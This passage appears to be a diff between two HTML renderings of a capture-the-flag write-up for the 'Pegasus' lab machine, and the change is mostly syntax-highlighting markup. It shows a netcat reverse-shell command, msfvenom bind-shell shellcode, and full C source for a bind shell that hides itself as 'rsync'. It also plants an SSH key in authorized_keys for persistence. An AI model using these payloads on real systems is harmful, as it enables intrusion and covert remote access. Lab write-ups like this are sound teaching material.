 <p>Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.</p>
 <p>PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute <code>/bin/nc 192.168.56.102 4444 -e /bin/sh</code> or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.</p>
 <p>Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to <code>system()</code> in it:</p>
-<figure><img src="https://leonjza.github.io/images/pegasus_code_review_security.png"/>
+<figure class=left>
+<img src=/images/pegasus_code_review_security.png>
 </figure>
-
-<p>Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to <a href="http://php.net/manual/en/function.system.php">system</a>, or C due to its <a href="http://linux.die.net/man/3/system">system</a>. Obviously though, <code>system()</code> is being filtered out, so I would need an alternative.</p>
+<p>Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to <a href=http://php.net/manual/en/function.system.php>system</a>, or C due to its <a href=http://linux.die.net/man/3/system>system</a>. Obviously though, <code>system()</code> is being filtered out, so I would need an alternative.</p>
 <p><em>insert fade to black</em></p>
 <p><em>CAPTION: many hours later</em></p>
 <p>After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#e5e5e5">#include</span><span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
-</span><span style="color:#e5e5e5"></span>
-<span style="color:#0f0">// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
-</span><span style="color:#0f0"></span><span style="color:#ee82ee">unsigned</span> <span style="color:#ee82ee">char</span> buf[] =
-<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80</span><span style="color:#87ceeb">&#34;</span>
-<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a</span><span style="color:#87ceeb">&#34;</span>
-<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0</span><span style="color:#87ceeb">&#34;</span>
-<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f</span><span style="color:#87ceeb">&#34;</span>
-<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0</span><span style="color:#87ceeb">&#34;</span>
-<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\x0b\xcd\x80</span><span style="color:#87ceeb">&#34;</span>;
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#75715e>// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
+</span><span style=color:#75715e></span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> buf[] <span style=color:#f92672>=</span>
+<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80</span><span style=color:#e6db74>&#34;</span>
+<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a</span><span style=color:#e6db74>&#34;</span>
+<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0</span><span style=color:#e6db74>&#34;</span>
+<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f</span><span style=color:#e6db74>&#34;</span>
+<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0</span><span style=color:#e6db74>&#34;</span>
+<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x0b\xcd\x80</span><span style=color:#e6db74>&#34;</span>;
 
-<span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>()
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
 {
-    <span style="color:#ee82ee">int</span> (*ret)() = (<span style="color:#ee82ee">int</span>(*)())buf;
+    <span style=color:#66d9ef>int</span> (<span style=color:#f92672>*</span>ret)() <span style=color:#f92672>=</span> (<span style=color:#66d9ef>int</span>(<span style=color:#f92672>*</span>)())buf;
     ret();
 }
-</code></pre></div><p>This was supposed to open me a <code>tcp/4444</code> shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on <a href="http://bigpointyteeth.se/code/bindshell.c">this</a>. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &lsquo;reviewed&rsquo;:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#0f0">// Source: http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=za
-</span><span style="color:#0f0">// http://bigpointyteeth.se/code/bindshell.c
-</span><span style="color:#0f0"></span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;sys/types.h&gt;</span><span style="color:#e5e5e5">
-</span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;sys/socket.h&gt;</span><span style="color:#e5e5e5">
-</span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;arpa/inet.h&gt;</span><span style="color:#e5e5e5">
-</span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
-</span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
-</span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;string.h&gt;</span><span style="color:#e5e5e5">
-</span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
-</span><span style="color:#e5e5e5"></span>
-<span style="color:#e5e5e5">#define SHELL &#34;/bin/sh&#34;   </span><span style="color:#0f0">// shell to execute
-</span><span style="color:#0f0"></span><span style="color:#e5e5e5">#define NAME &#34;rsync&#34;        </span><span style="color:#0f0">// name of the forked bindshell shown in ps
-</span><span style="color:#0f0"></span>
-<span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>(<span style="color:#ee82ee">int</span> argc, <span style="color:#ee82ee">char</span> *argv[]) {
-    <span style="color:#ee82ee">char</span> msg[<span style="color:#f60">16</span>];
-    <span style="color:#ee82ee">int</span> srv_sockfd, new_sockfd;
+</code></pre></div><p>This was supposed to open me a <code>tcp/4444</code> shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on <a href=http://bigpointyteeth.se/code/bindshell.c>this</a>. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &lsquo;reviewed&rsquo;:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>// Source: http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=za
+</span><span style=color:#75715e>// http://bigpointyteeth.se/code/bindshell.c
+</span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/socket.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;arpa/inet.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#75715e>#define SHELL &#34;/bin/sh&#34;   </span><span style=color:#75715e>// shell to execute
+</span><span style=color:#75715e></span><span style=color:#75715e>#define NAME &#34;rsync&#34;        </span><span style=color:#75715e>// name of the forked bindshell shown in ps
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[]) {
+    <span style=color:#66d9ef>char</span> msg[<span style=color:#ae81ff>16</span>];
+    <span style=color:#66d9ef>int</span> srv_sockfd, new_sockfd;
     socklen_t new_addrlen;
-    <span style="color:#f00">struct</span> sockaddr_in srv_addr, new_addr;
+    <span style=color:#66d9ef>struct</span> sockaddr_in srv_addr, new_addr;
 
-    <span style="color:#0f0">// fork into background
-</span><span style="color:#0f0"></span>    <span style="color:#f00">if</span> (fork() == <span style="color:#f60">0</span>) {
-        <span style="color:#f00">if</span> ((srv_sockfd = socket(PF_INET, SOCK_STREAM, <span style="color:#f60">0</span>)) &lt; <span style="color:#f60">0</span>) {
-            <span style="color:#f00">return</span> -<span style="color:#f60">1</span>;
+    <span style=color:#75715e>// fork into background
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
+        <span style=color:#66d9ef>if</span> ((srv_sockfd <span style=color:#f92672>=</span> socket(PF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>)) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+            <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
         }
 
-        srv_addr.sin_family = PF_INET;
-        srv_addr.sin_port = htons(atoi(<span style="color:#87ceeb">&#34;4444&#34;</span>));
-        srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+        srv_addr.sin_family <span style=color:#f92672>=</span> PF_INET;
+        srv_addr.sin_port <span style=color:#f92672>=</span> htons(atoi(<span style=color:#e6db74>&#34;4444&#34;</span>));
+        srv_addr.sin_addr.s_addr <span style=color:#f92672>=</span> htonl(INADDR_ANY);
 
-        <span style="color:#f00">if</span> (bind(srv_sockfd, (<span style="color:#f00">struct</span> sockaddr *)&amp;srv_addr, <span style="color:#f00">sizeof</span>(srv_addr)) &lt; <span style="color:#f60">0</span>) {
-            <span style="color:#f00">return</span> -<span style="color:#f60">1</span>;
+        <span style=color:#66d9ef>if</span> (bind(srv_sockfd, (<span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>srv_addr, <span style=color:#66d9ef>sizeof</span>(srv_addr)) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+            <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
         }
 
-        <span style="color:#f00">if</span> (listen(srv_sockfd, <span style="color:#f60">1</span>) &lt; <span style="color:#f60">0</span>) {
-            <span style="color:#f00">return</span> -<span style="color:#f60">1</span>;
+        <span style=color:#66d9ef>if</span> (listen(srv_sockfd, <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+            <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
         }
 
-        <span style="color:#0f0">// accept loop
-</span><span style="color:#0f0"></span>        <span style="color:#f00">for</span> (;;) {
-            new_addrlen = <span style="color:#f00">sizeof</span>(new_addr);
-            new_sockfd = accept(srv_sockfd, (<span style="color:#f00">struct</span> sockaddr *)&amp;new_addr, &amp;new_addrlen);
-            <span style="color:#f00">if</span> (new_sockfd &lt; <span style="color:#f60">0</span>) {
-                <span style="color:#f00">return</span> -<span style="color:#f60">1</span>;
+        <span style=color:#75715e>// accept loop
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>for</span> (;;) {
+            new_addrlen <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(new_addr);
+            new_sockfd <span style=color:#f92672>=</span> accept(srv_sockfd, (<span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>new_addr, <span style=color:#f92672>&amp;</span>new_addrlen);
+            <span style=color:#66d9ef>if</span> (new_sockfd <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+                <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
             }
 
-            <span style="color:#0f0">// fork to handle new connection
-</span><span style="color:#0f0"></span>            <span style="color:#f00">if</span> (fork() == <span style="color:#f60">0</span>) {
-                <span style="color:#0f0">// close old listener
-</span><span style="color:#0f0"></span>                close(srv_sockfd);
-                <span style="color:#0f0">// print the parent pid which should be killed in order
-</span><span style="color:#0f0"></span>                <span style="color:#0f0">// to remove the persistant bindshell listener
-</span><span style="color:#0f0"></span>                sprintf(msg, <span style="color:#87ceeb">&#34;ppid=%d</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, getppid());
+            <span style=color:#75715e>// fork to handle new connection
+</span><span style=color:#75715e></span>            <span style=color:#66d9ef>if</span> (fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
+                <span style=color:#75715e>// close old listener
+</span><span style=color:#75715e></span>                close(srv_sockfd);
+                <span style=color:#75715e>// print the parent pid which should be killed in order
+</span><span style=color:#75715e></span>                <span style=color:#75715e>// to remove the persistant bindshell listener
+</span><span style=color:#75715e></span>                sprintf(msg, <span style=color:#e6db74>&#34;ppid=%d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, getppid());
                 write(new_sockfd, msg, strlen(msg));
 
-                dup2(new_sockfd, <span style="color:#f60">2</span>);
-                dup2(new_sockfd, <span style="color:#f60">1</span>);
-                dup2(new_sockfd, <span style="color:#f60">0</span>);
+                dup2(new_sockfd, <span style=color:#ae81ff>2</span>);
+                dup2(new_sockfd, <span style=color:#ae81ff>1</span>);
+                dup2(new_sockfd, <span style=color:#ae81ff>0</span>);
 
                 execl(SHELL, NAME, NULL);
-                <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
+                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
             }
-            <span style="color:#f00">else</span>
+            <span style=color:#66d9ef>else</span>
                 close(new_sockfd);
-        } <span style="color:#0f0">// end accept loop
-</span><span style="color:#0f0"></span>    } <span style="color:#0f0">// end fork into background
-</span><span style="color:#0f0"></span>    <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
+        } <span style=color:#75715e>// end accept loop
+</span><span style=color:#75715e></span>    } <span style=color:#75715e>// end fork into background
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
 }
 </code></pre></div><p>All of my attempts were followed by a nmap on <code>tcp/4444</code> to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nmap 192.168.56.101 -p <span style="color:#f60">4444</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap 192.168.56.101 -p <span style=color:#ae81ff>4444</span>
 
-Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 11:33 SAST
-Nmap scan report <span style="color:#f00">for</span> 192.168.56.101
-Host is up (0.00034s latency).
+Starting Nmap 6.47 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-12-23 11:33 SAST
+Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.101
+Host is up <span style=color:#f92672>(</span>0.00034s latency<span style=color:#f92672>)</span>.
 PORT     STATE SERVICE
 4444/tcp open  krb524
-MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)
+MAC Address: 08:00:27:88:F8:40 <span style=color:#f92672>(</span>Cadmus Computer Systems<span style=color:#f92672>)</span>
 
-Nmap <span style="color:#f00">done</span>: <span style="color:#f60">1</span> IP address (<span style="color:#f60">1</span> host up) scanned in 0.17 seconds
+Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 0.17 seconds
 </code></pre></div><p>Awesome, so lets connect and see what we have:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nc -v 192.168.56.101 <span style="color:#f60">4444</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nc -v 192.168.56.101 <span style=color:#ae81ff>4444</span>
 192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
-(UNKNOWN) [192.168.56.101] <span style="color:#f60">4444</span> (?) open
-<span style="color:#eedd82">ppid</span>=<span style="color:#f60">10450</span>
+<span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>192.168.56.101<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> <span style=color:#f92672>(</span>?<span style=color:#f92672>)</span> open
+ppid<span style=color:#f92672>=</span><span style=color:#ae81ff>10450</span>
 id
-<span style="color:#eedd82">uid</span>=1001(mike) <span style="color:#eedd82">gid</span>=1001(mike) <span style="color:#eedd82">groups</span>=1001(mike)
+uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span>
 </code></pre></div><p>As was hoped for, a shell as <code>mike</code>. I quickly generated a new ssh key pair for Pegasus, and cat the public key to <code>mike</code>&rsquo;s <code>authorized_keys</code> file and went on to SSH in as mike:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># first I cat the public key so that I can copy it</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># first I cat the public key so that I can copy it</span>
 root@kali:~# cat pegasus.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali
 
-<span style="color:#0f0"># next I connect to the bind shell listener and move to Mikes .shh directory</span>
-root@kali:~# nc -v 192.168.56.101 <span style="color:#f60">4444</span>
+<span style=color:#75715e># next I connect to the bind shell listener and move to Mikes .shh directory</span>
+root@kali:~# nc -v 192.168.56.101 <span style=color:#ae81ff>4444</span>
 192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
-(UNKNOWN) [192.168.56.101] <span style="color:#f60">4444</span> (?) open
-<span style="color:#eedd82">ppid</span>=<span style="color:#f60">10450</span>
+<span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>192.168.56.101<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> <span style=color:#f92672>(</span>?<span style=color:#f92672>)</span> open
+ppid<span style=color:#f92672>=</span><span style=color:#ae81ff>10450</span>
 cd .ssh
 
-<span style="color:#0f0"># next we append my public key to mikes authorized_keys</span>
-echo <span style="color:#87ceeb">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R&#34;</span> &gt;&gt; authorized_keys
+<span style=color:#75715e># next we append my public key to mikes authorized_keys</span>
+echo <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R&#34;</span> &gt;&gt; authorized_keys
 ls -lh
 total 12K
--rw-rw-r-- <span style="color:#f60">1</span> mike mike  <span style="color:#f60">381</span> Dec <span style="color:#f60">23</span> 20:36 authorized_keys
--rw------- <span style="color:#f60">1</span> mike mike 1.7K Nov <span style="color:#f60">18</span> 12:39 id_rsa
--rw-r--r-- <span style="color:#f60">1</span> mike mike  <span style="color:#f60">222</span> Nov <span style="color:#f60">18</span> 17:39 known_hosts
-chmod <span style="color:#f60">600</span> authorized_keys
+-rw-rw-r-- <span style=color:#ae81ff>1</span> mike mike  <span style=color:#ae81ff>381</span> Dec <span style=color:#ae81ff>23</span> 20:36 authorized_keys
+-rw------- <span style=color:#ae81ff>1</span> mike mike 1.7K Nov <span style=color:#ae81ff>18</span> 12:39 id_rsa
+-rw-r--r-- <span style=color:#ae81ff>1</span> mike mike  <span style=color:#ae81ff>222</span> Nov <span style=color:#ae81ff>18</span> 17:39 known_hosts
+chmod <span style=color:#ae81ff>600</span> authorized_keys
 ^C
 
-<span style="color:#0f0"># with the authorized_keys ready, I SSH in as mike using my key pair</span>
+<span style=color:#75715e># with the authorized_keys ready, I SSH in as mike using my key pair</span>
 root@kali:~# ssh mike@192.168.56.101 -i pegasus
-Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)
+Welcome to Ubuntu 12.04.5 LTS <span style=color:#f92672>(</span>GNU/Linux 3.13.0-39-generic i686<span style=color:#f92672>)</span>
 
  * Documentation:  https://help.ubuntu.com/
 
-  System information as of Tue Dec <span style="color:#f60">23</span> 20:36:47 AEDT <span style="color:#f60">2014</span>
+  System information as of Tue Dec <span style=color:#ae81ff>23</span> 20:36:47 AEDT <span style=color:#ae81ff>2014</span>
 
-  System load:  0.0               Processes:           <span style="color:#f60">93</span>
-  Usage of /:   6.8% of 18.32GB   Users logged in:     <span style="color:#f60">0</span>
-  Memory usage: 12%               IP address <span style="color:#f00">for</span> eth0: 192.168.56.101
+  System load:  0.0               Processes:           <span style=color:#ae81ff>93</span>
+  Usage of /:   6.8% of 18.32GB   Users logged in:     <span style=color:#ae81ff>0</span>
+  Memory usage: 12%               IP address <span style=color:#66d9ef>for</span> eth0: 192.168.56.101
   Swap usage:   0%
 
-  =&gt; There are <span style="color:#f60">2</span> zombie processes.
+  <span style=color:#f92672>=</span>&gt; There are <span style=color:#ae81ff>2</span> zombie processes.
 
   Graph this data and manage this system at:
     https://landscape.canonical.com/
 
 
-Your Hardware Enablement Stack (HWE) is supported <span style="color:#f00">until</span> April 2017.
+Your Hardware Enablement Stack <span style=color:#f92672>(</span>HWE<span style=color:#f92672>)</span> is supported <span style=color:#66d9ef>until</span> April 2017.
 
 You have mail.
-Last login: Tue Dec <span style="color:#f60">16</span> 19:27:53 <span style="color:#f60">2014</span> from 172.16.246.129
+Last login: Tue Dec <span style=color:#ae81ff>16</span> 19:27:53 <span style=color:#ae81ff>2014</span> from 172.16.246.129
 mike@pegasus:~$
-</code></pre></div><h2 id="my_first-your_first-we_all_first">my_first, your_first, we_all_first</h2>
+</code></pre></div><h2 id=my_first-your_first-we_all_first>my_first, your_first, we_all_first</h2>
 <p>With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in <code>mike</code>&rsquo;s home (we will get to it shortly):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:~$ ls -lh
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ ls -lh
 total 16K
--rwxr-xr-x <span style="color:#f60">1</span> mike mike  <span style="color:#f60">845</span> Nov <span style="color:#f60">18</span> 20:52 check_code.sh
-drwx------ <span style="color:#f60">2</span> mike mike 4.0K Nov <span style="color:#f60">18</span> 17:49 Mail
--rwsr-xr-x <span style="color:#f60">1</span> john john 6.5K Nov <span style="color:#f60">28</span> 10:26 my_first
+-rwxr-xr-x <span style=color:#ae81ff>1</span> mike mike  <span style=color:#ae81ff>845</span> Nov <span style=color:#ae81ff>18</span> 20:52 check_code.sh
+drwx------ <span style=color:#ae81ff>2</span> mike mike 4.0K Nov <span style=color:#ae81ff>18</span> 17:49 Mail
+-rwsr-xr-x <span style=color:#ae81ff>1</span> john john 6.5K Nov <span style=color:#ae81ff>28</span> 10:26 my_first
 </code></pre></div><p>More enumeration revealed that <code>/opt/</code> had a number of interesting parts to it as well:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:~$ ls -lh /opt/
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ ls -lh /opt/
 total 12K
-drwxrwxrwx <span style="color:#f60">2</span> root root 4.0K Dec <span style="color:#f60">23</span> 20:33 code_review
-drwxr-xr-x <span style="color:#f60">3</span> root root 4.0K Nov <span style="color:#f60">25</span> 04:38 git
-drwxr-xr-x <span style="color:#f60">2</span> root root 4.0K Nov <span style="color:#f60">18</span> 14:43 nfs
+drwxrwxrwx <span style=color:#ae81ff>2</span> root root 4.0K Dec <span style=color:#ae81ff>23</span> 20:33 code_review
+drwxr-xr-x <span style=color:#ae81ff>3</span> root root 4.0K Nov <span style=color:#ae81ff>25</span> 04:38 git
+drwxr-xr-x <span style=color:#ae81ff>2</span> root root 4.0K Nov <span style=color:#ae81ff>18</span> 14:43 nfs
 </code></pre></div><p>Piecing the web interface together, you will see that the submitted source is put into <code>code.c</code> in <code>/opt/code_review/</code>, and then compiled from the script in <code>/home/mike/check_code.sh</code> and eventually executed.</p>
 <p>The <code>/opt/git/</code> folder had what looked like remnants of the typical <code>.git/</code> folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the <code>main.c</code> file from the git history.</p>
-<h3 id="rebuilding-mainc">rebuilding main.c</h3>
